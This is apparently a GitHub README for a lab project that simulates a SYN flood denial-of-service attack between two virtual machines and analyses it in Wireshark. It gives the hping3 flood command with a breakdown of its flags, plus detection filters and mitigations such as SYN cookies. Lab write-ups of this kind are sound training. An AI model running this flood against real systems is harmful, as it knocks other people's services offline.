# 🚀 SYN Flood Attack Simulation & Packet Analysis  
_A Cybersecurity Lab Project_

![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Cybersecurity-red?style=for-the-badge)
![Attack](https://img.shields.io/badge/Attack-SYN_Flood-critical?style=for-the-badge)
![Parrot OS](https://img.shields.io/badge/OS-Parrot%20OS-darkgreen?style=for-the-badge)
![Wireshark](https://img.shields.io/badge/Tool-Wireshark-blue?style=for-the-badge)
![hping3](https://img.shields.io/badge/Tool-hping3-orange?style=for-the-badge)

---

## 📌 Overview

This project demonstrates a **SYN Flood Denial-of-Service (DoS) attack** performed in a controlled virtual cybersecurity lab environment using:

- **Parrot OS** (Attacker + Victim)
- **VirtualBox Host-Only Networking**
- **hping3** for generating malicious traffic
- **Wireshark** for network packet capture and analysis

> ⚠️ **Ethical Notice**  
> This experiment was conducted in an isolated lab environment strictly for learning and research.  
> Do **NOT** attempt these techniques on systems you do not own or do not have explicit authorization to test.

---

## 🧪 Lab Configuration

| Component                  | Details       |
|---------------------------|--------------|
| Hypervisor                | VirtualBox   |
| Operating System (Attacker) | Parrot OS  |
| Operating System (Victim) | Parrot OS    |
| Network Mode              | Host-Only    |
| Attacker Address          | `[REDACTED]` |
| Victim Address            | `[REDACTED]` |

---

## 🛠 Tools Used

| Tool        | Purpose                               |
|------------|----------------------------------------|
| `hping3`   | Generates SYN flood traffic            |
| Wireshark  | Packet inspection and analysis         |
| `netstat`  | Live TCP connection state monitoring   |
| Metasploit | Optional framework for further testing |

---

## ⚙️ Execution Steps

### 1️⃣ Install Required Tools

**On Attacker:**

~~~bash
sudo apt update
sudo apt install hping3 metasploit-framework -y
~~~

**On Victim:**

~~~bash
sudo apt update
sudo apt install wireshark -y
~~~

---

### 2️⃣ Start Packet Capture (Victim)

On the victim machine:

1. Open **Wireshark**.
2. Select the appropriate network interface (Host-Only adapter).
3. Start capture and apply the display filter:

~~~text
tcp.flags.syn == 1 && tcp.flags.ack == 0
~~~

This filter focuses on SYN packets that **do not** have the ACK flag set, which is typical of SYN flood traffic.

---

### 3️⃣ Launch the SYN Flood (Attacker)

On the attacker machine, run:

~~~bash
sudo hping3 -S --flood -p 80 <VICTIM-IP>
~~~

**Parameter breakdown:**

| Flag        | Meaning                          |
|------------|-----------------------------------|
| `-S`       | Send TCP packets with SYN flag    |
| `--flood`  | Send packets as fast as possible  |
| `-p 80`    | Target TCP port (HTTP)            |
| `<VICTIM-IP>` | IP address of the victim      |

---

### 4️⃣ Verify Impact (Victim)

On the victim, check TCP connection states:

~~~bash
netstat -ant | grep SYN_RECV
~~~

You should observe:

- Multiple connections stuck in `SYN_RECV` state  
- Few or no fully established connections  
- Signs of resource exhaustion / service degradation  

---

## 📊 Results & Indicators

| Indicator                                 | Observed | Notes                           |
|-------------------------------------------|----------|---------------------------------|
| High volume of SYN packets                | ✔        | Visible in Wireshark           |
| Lack of ACK responses                     | ✔        | Incomplete TCP handshakes      |
| Many connections in `SYN_RECV` state      | ✔        | Half-open connections          |
| Potential slow-down of victim services    | ✔ (lab)  | Simulated DoS behavior         |

---

## 🧯 Mitigation Recommendations

| Defense Technique                         | Purpose                                  |
|-------------------------------------------|------------------------------------------|
| Enable SYN cookies                        | Protect TCP backlog from exhaustion      |
| Firewall rate limiting (iptables/ufw)     | Throttle excessive SYN requests          |
| IDS/IPS (Snort, Suricata)                 | Detect anomalous network traffic         |
| Fail2Ban / firewall automation            | Block abusive or repeated offenders      |

Example of enabling SYN cookies:

~~~bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
~~~


## 🎯 Conclusion

This project successfully demonstrates how a SYN Flood attack can be executed and identified in a controlled lab environment. By analyzing packet captures and TCP connection states, it becomes clear how incomplete TCP handshakes can be used to overwhelm a target system.

The exercise reinforces key concepts in:

- Network security  
- Traffic forensics  
- Incident detection & response  


### 📬 Connect

If you find this useful, feel free to **star ⭐ the repo**, **fork** it, or open an **issue** with suggestions!
